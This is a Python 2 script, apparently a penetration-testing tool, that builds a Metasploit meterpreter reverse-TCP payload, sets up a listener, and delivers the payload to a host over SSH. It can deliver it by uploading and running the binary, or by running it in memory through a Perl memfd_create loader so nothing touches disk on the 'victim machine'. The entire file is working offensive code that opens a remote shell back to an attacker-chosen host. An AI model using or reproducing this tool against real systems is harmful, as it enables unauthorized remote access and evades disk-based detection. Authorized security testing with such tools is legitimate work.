#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#                                                                                                           #
#███▄ ▄███▓▓█████▄▄▄█████▓▓█████  ██▀███   ██▓███   ██▀███  ▓█████▄▄▄█████▓▓█████  ██▀███                   #
#▓██▒▀█▀ ██▒▓█   ▀▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▓██░  ██▒▓██ ▒ ██▒▓█   ▀▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒                #
#▓██    ▓██░▒███  ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▓██░ ██▓▒▓██ ░▄█ ▒▒███  ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒                #
#▒██    ▒██ ▒▓█  ▄░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄                  #
#▒██▒   ░██▒░▒████▒ ▒██▒ ░ ░▒████▒░██▓ ▒██▒▒██▒ ░  ░░██▓ ▒██▒░▒████▒ ▒██▒ ░ ░▒████▒░██▓ ▒██▒                #
#░ ▒░   ░  ░░░ ▒░ ░ ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░                #
#░  ░      ░ ░ ░  ░   ░     ░ ░  ░  ░▒ ░ ▒░░▒ ░       ░▒ ░ ▒░ ░ ░  ░   ░     ░ ░  ░  ░▒ ░ ▒░                #
#░      ░      ░    ░         ░     ░░   ░ ░░         ░░   ░    ░    ░         ░     ░░   ░                 #
#░      ░  ░           ░  ░   ░                 ░        ░  ░           ░  ░   ░                            #
#                                                                                                           #
# meterpreter.py - nighter@nighter.se                                                                       #
#                                                                                                           #
# DATE                                                                                                      #
# 14/06/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Not a vuln or a finding! Instead this will load meterpreter payload over SSH to give access               #
# to all post modules from msf on a host so i can be used in security testing.                              #
#                                                                                                           #
# Mikael Kall - nighter@nighter.se                                                                          #
#                                                                                                           #
#############################################################################################################

import random
import getpass
import paramiko
import signal
import time
import sys
import os

from subprocess import Popen
from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def create_perl_mem_payload():
    if os.path.isfile('/tmp/%s' % FILENAME) is False:
        print("Missing payload file")
        return False

    payload_file = '/tmp/%s' % FILENAME
    perl_payload_file = '/tmp/%s.pl' % FILENAME

    payload = '''#!/usr/bin/env perl 
use warnings;
use strict;
$|=1;
my $name = "";
my $fd = syscall(319, $name, 1);
if (-1 == $fd) {
   die "memfd_create: $!"; 
}
print "fd $fd\\n";
open(my $FH, '>&='.$fd) or die "open: $!";
select((select($FH), $|=1)[0]);
'''
    with open(perl_payload_file, 'w') as f:
        f.write(payload)

    command = '''perl -e '$/=\\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \\$!/;\\n"while(<>)' %s >> %s''' % (payload_file, perl_payload_file)
    os.system(command)

    payload = '''exec {"/proc/$$/fd/$fd"} "%s" or die "exec: $!";''' % payload_file
    with open(perl_payload_file, 'a') as f:
        f.write(payload)

    print("[+] Saved %s" % perl_payload_file)


def msfvenom():

    command = "msfvenom --platform linux -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > /tmp/%s" % (LHOST, LPORT, FILENAME)
    os.system(command)

    if INMEM == 'true':
        create_perl_mem_payload()

def listener():

    payload = "use exploit/multi/handler\n"
    payload += "set PAYLOAD linux/x64/meterpreter/reverse_tcp\n"
    payload += "set LHOST %s\n" % LHOST
    payload += "set LPORT %s\n" % LPORT
    payload += "set ExitOnSession false\n"
    payload += "exploit -j -z\n"

    with open('/tmp/meterpreter.rc', 'w') as file:
        file.write(payload)

    command = "msfconsole -r /tmp/meterpreter.rc"
    os.system(command)

def ssh_upload_and_execute():

    time.sleep(20)

    if INMEM == 'true':
        command = "sshpass -p '%s' ssh -p %s %s@%s perl < /tmp/%s.pl" % (PASSWORD, PORT, USER, IP, FILENAME)
        os.system(command)
    else:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(IP, username=USER, password=PASSWORD, port=PORT)
        sftp = ssh.open_sftp()
        sftp.put('/tmp/%s' % FILENAME, '/tmp/%s' % FILENAME)
        ssh.exec_command("chmod a+x /tmp/%s" % FILENAME)
        ssh.exec_command("nohup /tmp/%s &" % FILENAME)

def print_usage():
    print ("""
 ███▄ ▄███▓▓█████▄▄▄█████▓▓█████  ██▀███   ██▓███   ██▀███  ▓█████▄▄▄█████▓▓█████  ██▀███
▓██▒▀█▀ ██▒▓█   ▀▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▓██░  ██▒▓██ ▒ ██▒▓█   ▀▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▓██    ▓██░▒███  ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▓██░ ██▓▒▓██ ░▄█ ▒▒███  ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
▒██    ▒██ ▒▓█  ▄░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄
▒██▒   ░██▒░▒████▒ ▒██▒ ░ ░▒████▒░██▓ ▒██▒▒██▒ ░  ░░██▓ ▒██▒░▒████▒ ▒██▒ ░ ░▒████▒░██▓ ▒██▒
░ ▒░   ░  ░░░ ▒░ ░ ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
░  ░      ░ ░ ░  ░   ░     ░ ░  ░  ░▒ ░ ▒░░▒ ░       ░▒ ░ ▒░ ░ ░  ░   ░     ░ ░  ░  ░▒ ░ ▒░
░      ░      ░    ░         ░     ░░   ░ ░░         ░░   ░    ░    ░         ░     ░░   ░
       ░      ░  ░           ░  ░   ░                 ░        ░  ░           ░  ░   ░

Add optional argument to true if you want to run payload without touch disk on victim machine.

[nighter@nighter.se]
    """)
    print "Usage: %s <USERNAME>@<HOST> <LHOST> <LPORT> [true/false]" % (sys.argv[0])
    print "\nEXAMPLE: meterpreter.py 'username@127.0.0.1' 10.100.12.xx 1337 [true/false]\n"
    sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) < 4:
        print_usage()

    INMEM = 'false'

    HOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    try:
        if sys.argv[4]:
            INMEM = sys.argv[4]
    except:
        pass

    # Generate random number as filename
    FILENAME = str(random.random())[-1]

    if '@' not in HOST:
        print_usage()
    else:
        USER = HOST.split('@')[0]
        IP = HOST.split('@')[1]

    if ':' in IP:
        PORT = IP.split(':')[1]
        IP = IP.split(':')[0]
    else:
        PORT = 22

    PASSWORD = getpass.getpass('Password:')

    # Generate payload
    msfvenom()

    # Upload payload async
    p = Process(target=ssh_upload_and_execute)
    p.start()

    # Setup listener
    listener()
